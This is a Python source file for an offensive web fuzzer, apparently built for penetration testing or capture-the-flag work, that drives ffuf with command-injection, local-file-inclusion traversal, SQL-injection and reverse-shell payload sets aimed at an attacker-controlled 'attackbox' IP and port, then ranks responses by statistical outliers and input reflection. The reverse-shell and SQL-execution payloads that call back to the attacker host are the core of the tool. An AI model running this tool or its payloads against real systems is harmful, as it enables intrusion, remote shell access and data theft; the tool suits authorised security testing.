import argparse
import hashlib
import json
import numpy as np
import os
import re
import shutil

from glob import glob
from multiprocessing import Pool, cpu_count
from tqdm import tqdm

from .data_classes import *
from .util import find_common_substrings, parse_http_response
from .encoders import *
from .revshells import get_revshells
from .sql import *
from .wordlists import wordlist_strip_prefix

# TODO: Remote file inclusion?
#   - Test if we can establish a connection to a file hosted on a local webserver (configure http-server to serve basic shell.php).
# TODO: PHP filters (php://filter/... and data://...)

def relpath_linux(args):
    return [b"", b"../", b"../../", b"../../../", b"../../../../../../../../../../../../", b"/", b"~/"]

def relpath_windows(args):
    return [b"", b".\\", b"..\\", b"..\\..\\", b"..\\..\\..\\", b"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\", b"C:\\"]

def relpath(args):
    return relpath_linux(args) + relpath_windows(args)

FUZZ_TYPES = {
    "command-injection": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            "/usr/share/seclists/Fuzzing/command-injection-commix.txt"
        ]),
    ], encoders=[identity_encoder], required_args=[]),

    "lfi-general": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            relpath,
            [wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt", [b"/", b"c:\\", b"C:\\", b"c:/", b"C:/"])]
        ]),
    ], encoders=[url_encoder], required_args=[]),

    "lfi-general-linux": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            relpath_linux,
            [wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt", [b"~/", b"/", b"~"])]
        ]),
    ], encoders=[url_encoder], required_args=[]),

    "lfi-general-linux-extra": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            relpath_linux,
            [wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt", [b"/"])]
        ]),
    ], encoders=[url_encoder], required_args=[]),

    "lfi-general-windows": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            relpath_windows, [
                wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt", [b"c:\\", b"C:\\", b"c:/", b"C:/"]),
                wordlist_strip_prefix("/usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt", [b"/", b"c:\\", b"C:\\", b"c:/", b"C:/"])
            ]
        ]),
    ], encoders=[url_encoder], required_args=[]),

    "lfi-known-part": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            relpath,
            lambda args: [args.known_part.encode()]
        ]),
    ], encoders=[url_encoder], required_args=["known_part"]),
    
    "lfi-known-part-linux": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            relpath_linux,
            lambda args: [args.known_part.encode()],
            "/usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt"
        ]),
    ], encoders=[url_encoder], required_args=["known_part"]),

    "revshell-linux": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port, args.attackbox_web_port, os="linux")]
        ]),
    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_port", "attackbox_web_port"]),

    "revshell-windows": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port, args.attackbox_web_port, os="windows")]
        ]),
    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_port", "attackbox_web_port"]),

    "sqli-execute-linux": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            sqli_execute_linux
        ]),
    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_web_port"]),

    "sqli-execute-windows": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            sqli_execute_windows
        ]),
    ], encoders=[url_encoder_strict], required_args=["attackbox_ip", "attackbox_web_port"]),

    "sqli-identify": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            "/usr/share/wordlists/wfuzz/Injections/SQL.txt"
        ]),
    ], encoders=[url_encoder_strict], required_args=[]),

    "sqli-union": FuzzType(params = [
        FuzzParameter(name="FUZZ", wordlists=[
            sqli_prefix,
            sqli_union,
            sqli_suffix,
        ]),
    ], encoders=[url_encoder_strict], required_args=[]),
}

MAX_DISPLAY_RESULTS = 10

def key_by(scan_results: list, key: str):
    results = {}

    for scan_result in scan_results:
        k_val = getattr(scan_result, key)

        if k_val not in results:
            results[k_val] = set()
        
        results[k_val].add(scan_result)
    
    return results

def compute_outliers(values, z_scores):
    max_z_score = int(round(max(z_scores), 0)) + 1
    for start_z in range(max_z_score, 0, -1):
        outliers = values[z_scores > start_z]

        if len(outliers) > 0:
            yield outliers.tolist(), start_z

            for z in range(start_z - 1, 0, -1): # Yield 2 more
                yield values[z_scores > z].tolist(), z

            break

def compute_analysis_groups(keyed_results: dict):
    if len(keyed_results.keys()) == 0:
        return [], 0, 0

    weighted_dict = {}
    for key in keyed_results:
        weighted_dict[key] = len(keyed_results[key])
    
    values = np.array(list(weighted_dict.keys()), dtype=float)
    weights = np.array(list(weighted_dict.values()), dtype=float)

    mean = np.average(values, weights=weights)
    variance = np.average((values - mean)**2, weights=weights)

    std = np.sqrt(variance)
    if std == 0:
        std = 0.000000000001

    z_scores = np.abs(values - mean) / std

    return compute_outliers(values, z_scores), mean, std

def display_analysis_group(keyed_results: dict, total: int):
    for i, (k_val, results) in enumerate(sorted(keyed_results.items(), key=lambda s: s[0], reverse=True)):
        if i >= 50: # Cap at displaying 50 results
            break

        results = list(sorted(results, key=lambda r: r.url))

        print(f"{k_val} ({round(len(results) / total * 100, 2)}% of all results):")
        for result in results[:MAX_DISPLAY_RESULTS]:
            print(f"- {dict(result.payloads)}")
        
        if len(results) > MAX_DISPLAY_RESULTS:
            print("- ...")
        
        print()


def display_analysis(scan_results: list, key: str, key_name: str, outlier_based = False):
    total = len(scan_results)
    keyed_results = key_by(scan_results, key)
    
    if outlier_based:
        outliers, mean, std = compute_analysis_groups(keyed_results)
        print(f"\033[38;5;28m----- Results for {key_name} (mean={round(mean, 2)}, std={round(std, 2)}):\033[0m")

        displayed_outliers = set()
        for outliers, z in outliers:
            keyed_results_outliers = {}
            for key in keyed_results:
                if key not in outliers or key in displayed_outliers:
                    continue
                
                keyed_results_outliers[key] = keyed_results[key]
                displayed_outliers.add(key)
            
            if len(keyed_results_outliers.keys()) == 0:
                continue

            print(f"\033[38;5;114m--- New outliers for z={z}:\033[0m")
            display_analysis_group(keyed_results_outliers, total)
        
        return
    
    print(f"\033[38;5;28m----- Results for {key_name}:\033[0m")
    display_analysis_group(keyed_results, total)

def display_missing_payloads_analysis(missing_payloads: dict):
    print(f"\033[38;5;28m----- Missing payloads in results analysis:\033[0m")

    for data_file, params_payloads in missing_payloads.items():
        print(f"\033[38;5;114m--- Missing payloads for {data_file}:\033[0m")

        for param, payloads_linenos in sorted(params_payloads.items(), key=lambda item: item[0]):
            for payload, _ in sorted(payloads_linenos.items(), key=lambda item: min(item[1])):
                print(f"- Parameter \033[38;5;24m{param}\033[0m: Missing payload \033[38;5;117m{payload}\033[0m")


        print()

def find_substrings(args):
    scan_result, targets, min_len = args

    # Add individual payloads as targets as well
    for _, payload in scan_result.payloads:
        if len(payload) >= min_len:
            targets.add(payload.encode())

    substrings = find_common_substrings(targets, scan_result.response_body, min_len)
    return scan_result, substrings

def display_response_analysis(scan_results: list, targets: set, min_len=8):
    targets = set(filter(lambda t: len(t) >= min_len, targets))
    matches = {}

    pool_args = [(scan_result, targets, min_len) for scan_result in scan_results]
    with Pool(cpu_count() // 2) as pool:
        for scan_result, substrings in tqdm(pool.imap_unordered(find_substrings, pool_args), total=len(pool_args), desc="Analyzing reflection substrings..."):
            for substring in substrings:
                if scan_result not in matches:
                    matches[scan_result] = set()
                
                matches[scan_result].add(substring)
    
    print(f"\033[38;5;28m----- Results for substring reflection:\033[0m")

    # Sort by length of longest substring and then number of substrings secondary
    sorted_results = sorted(matches.items(), key=lambda sr_subs: (max([len(s) for s in sr_subs[1]]), len(sr_subs[1])), reverse=True)
    for i, (scan_result, substrings) in enumerate(sorted_results):
        if i >= 50: # Cap at displaying 50 results
            break
        
        print(f"\033[38;5;114m{dict(scan_result.payloads)} ({len(substrings)} substring matches):\033[0m")

        results = list(sorted(substrings, key=lambda m: len(m), reverse=True))
        for result in results[:MAX_DISPLAY_RESULTS]:
            print(f"- {result}")
        
        if len(results) > MAX_DISPLAY_RESULTS:
            print("- ...")
    
        print()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--proto', required=True, help="http or https")
    parser.add_argument('-r', '--request', required=True, help="Request template file")
    parser.add_argument('-t', '--types', required=True, choices=list(FUZZ_TYPES.keys()), nargs="+", help="Type of fuzz")
    parser.add_argument('-th', '--threads', type=int, default=4, help="Number of threads to run FFUF with")

    parser.add_argument('-mr', '--match-regex', help="Match regexp")
    parser.add_argument('-fr', '--filter-regex', help="Filter regexp")

    parser.add_argument('--attackbox-ip')
    parser.add_argument('--attackbox-port', type=int)
    parser.add_argument('--attackbox-web-port', type=int)
    parser.add_argument('--known-part')

    args = parser.parse_args()
    
    fuzz_types = [FUZZ_TYPES[t] for t in args.types]

    for typ, fuzz_type in zip(args.types, fuzz_types):
        for req_arg in fuzz_type.required_args:
            if not getattr(args, req_arg):
                print(f"Error: Argument `{req_arg.replace("_", "-")}` is required to perform `{typ}` fuzzing")
                return
            
    if args.known_part and (args.known_part[0] == "/" or args.known_part[-1] != "/"):
        print("--known-part should not start with a slash, and it should end with one")
        return

    if ("revshell-linux" in args.types or "revshell-windows" in args.types) and args.threads > 1:
        print("revshell-linux and revshell-windows must be run with 1 thread only!")
        return

    response_search_targets = set()
    with open(args.request, "rb") as f: # Check that params are given in the request file and determine substring search targets
        request_raw = f.read()

        for fuzz_type in fuzz_types:
            for param in fuzz_type.params:
                assert param.name.encode() in request_raw

        requestline_headers, request_body = request_raw, b""
        if b"\r\n\r\n" in request_raw or b"\n\n" in request_raw:
            requestline_headers, request_body = request_raw.split(b"\r\n\r\n") if b"\r\n\r\n" in request_raw else request_raw.split(b"\n\n")
        
        requestline, *headers = requestline_headers.split(b"\r\n") if b"\r\n" in requestline_headers else requestline_headers.split(b"\n")
        
        request_path = requestline.split(b" ")[1].decode()
        request_headers = dict([h.decode().split(": ") for h in headers if b": " in h])
        request_body = request_body.decode()

        request_query = request_path.split("?")[1] if "?" in request_path else ""
        request_params = dict([p.split("=") for p in request_query.split("&")]) if "&" in request_query else {}

        response_search_targets = set(request_params.values()).union(set(request_headers.values()))

        if request_body:
            response_search_targets.add(request_body)

        response_search_targets = set([t.encode() for t in response_search_targets])
    
    print(f"Will search for reflection of {response_search_targets} in response bodies. Make sure these inputs are as unique as possible!")
    
    config_hash = hashlib.md5(f"{args.proto}|{args.request}|{args.types}|{args.attackbox_ip}|{args.attackbox_port}|{args.known_part}".encode("utf-8")).hexdigest()
    data_dir = os.path.join(os.path.expanduser("~"), ".local", "share", "web-fuzzer", config_hash)
    shutil.rmtree(data_dir, ignore_errors=True)
    os.makedirs(data_dir)

    command_args = []
    for fuzz_type in fuzz_types:
        command_args.extend(fuzz_type.command_args(data_dir, args))

    for i, fuzz_args in enumerate(command_args):
        data_file = os.path.join(data_dir, f"ffuf-{i}.json")
        log_file = os.path.join(data_dir, f"ffuf-log-{i}.txt")
        os.system(f"ffuf -noninteractive -t {args.threads} -mc all -request-proto {args.proto} -request {args.request} -timeout 30{fuzz_args} -debug-log {log_file} -o {data_file} -of json -od {data_dir}/ > /dev/null")

    scan_results = set()
    missing_payloads = {}

    match_regex = re.compile(args.match_regex) if args.match_regex else None
    filter_regex = re.compile(args.filter_regex) if args.filter_regex else None

    data_files = glob(os.path.join(data_dir, "ffuf-*.json"))
    for data_file in sorted(data_files):
        with open(data_file, "rb") as f:
            scan = json.load(f)

            missing_payloads[data_file] = {}

            for wordlist_param in scan["config"]["wordlists"]:
                wordlist, param = wordlist_param.split(":")
                assert param not in missing_payloads[data_file]

                missing_payloads[data_file][param] = {}
                with open(wordlist) as f:
                    for i, line in enumerate(f.read().splitlines()):
                        if line not in missing_payloads[data_file][param]:
                            missing_payloads[data_file][param][line] = []
                        
                        missing_payloads[data_file][param][line].append(i)

            for result in scan["results"]:
                payloads = result["input"]
                del payloads["FFUFHASH"]

                resultfile_path = os.path.join(data_dir, result["resultfile"])
                with open(resultfile_path, "rb") as f:
                    request_raw, response_raw = f.read().split(b"\n---- \xe2\x86\x91 Request ---- Response \xe2\x86\x93 ----\n\n")
                
                response_body = parse_http_response(response_raw)
                response_body_str = response_body.decode('utf-8')

                if match_regex != None and match_regex.search(response_body_str) == None: # Ignore results not matching match_regex
                    continue
                
                if filter_regex != None and filter_regex.search(response_body_str) != None: # Ignore results matching filter_regex
                    continue

                scan_results.add(ScanResult(payloads=frozenset(payloads.items()), url=result["url"], status=result["status"], length=result["length"],
                                                words=result["words"], lines=result["lines"], content_type=result["content-type"], duration=result["duration"],
                                                response_body=response_body))

                for param, value in payloads.items():
                    if value in missing_payloads[data_file][param]:
                        del missing_payloads[data_file][param][value]

    display_analysis(scan_results, "status", "Status code")
    display_analysis(scan_results, "length", "Content length", outlier_based=True)
    display_analysis(scan_results, "words", "Content words", outlier_based=True)
    display_analysis(scan_results, "lines", "Content lines", outlier_based=True)
    display_analysis(scan_results, "duration", "Time to response (nanoseconds)", outlier_based=True)

    if args.match_regex or args.filter_regex:
        print("Skipping missing payloads analysis as --match-regex or --filter-regex is used")
    else:
        display_missing_payloads_analysis(missing_payloads)

    display_response_analysis(scan_results, response_search_targets)

if __name__ == "__main__":
    main()